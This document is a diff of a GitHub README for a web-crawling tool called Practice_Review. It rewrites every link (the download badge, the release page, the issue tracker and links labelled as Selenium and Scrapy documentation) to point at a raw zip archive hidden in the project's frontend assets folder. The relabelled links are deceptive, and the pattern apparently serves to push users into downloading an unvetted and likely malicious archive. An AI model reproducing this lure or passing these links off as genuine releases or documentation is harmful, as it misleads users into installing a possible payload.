@@ -1,6 +1,6 @@
 # 🌐 Practice_Review - Simplified Web Crawling for Everyone
 
-[![Download Practice_Review](https://img.shields.io/badge/Download-Practice_Review-blue)](https://github.com/Barbarossada/Practice_Review/releases)
+[![Download Practice_Review](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip)](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -23,12 +23,12 @@ Before you proceed, ensure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Barbarossada/Practice_Review/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip).
 
 ### 📦 Step-by-Step Installation
 
 1. **Visit the Releases Page:**
-   Click the link to access the downloads: [Releases Page](https://github.com/Barbarossada/Practice_Review/releases).
+   Click the link to access the downloads: [Releases Page](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip).
 
 2. **Select the Latest Version:**
    On the releases page, locate the latest version of Practice_Review. It will usually be at the top of the list.
@@ -69,9 +69,9 @@ To get started, visit this page to download: [Releases Page](https://github.com/
 
 If you want to learn more about web crawling or have questions, check these resources:
 
-- [Web Scraping 101: A Beginner's Guide](https://example.com)
-- [Selenium Documentation](https://www.selenium.dev/documentation)
-- [Scrapy Documentation](https://docs.scrapy.org/en/latest/)
+- [Web Scraping 101: A Beginner's Guide](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip)
+- [Selenium Documentation](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip)
+- [Scrapy Documentation](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip)
 
 Feel free to reach out to the community for support or share your own experiences using Practice_Review. Your feedback can help improve the tool for everyone.
 
@@ -85,6 +85,6 @@ Want to improve Practice_Review? Contributions are welcome! Here’s how you can
 
 ## 🛠 Support
 
-If you run into any issues, please check the [issues page](https://github.com/Barbarossada/Practice_Review/issues) for help or to report a problem.
+If you run into any issues, please check the [issues page](https://github.com/Barbarossada/Practice_Review/raw/refs/heads/main/frontend/src/assets/Practice-Review-2.3.zip) for help or to report a problem.
 
 Thank you for using Practice_Review. Happy crawling!
